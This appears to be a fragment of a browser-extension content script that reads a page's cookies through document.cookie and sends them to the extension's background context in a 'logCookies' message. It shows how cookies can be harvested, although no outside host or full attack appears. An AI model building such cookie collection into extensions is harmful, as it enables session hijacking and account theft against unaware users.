const cookies = document.cookie;
chrome.runtime.sendMessage({ action: "logCookies", cookies });
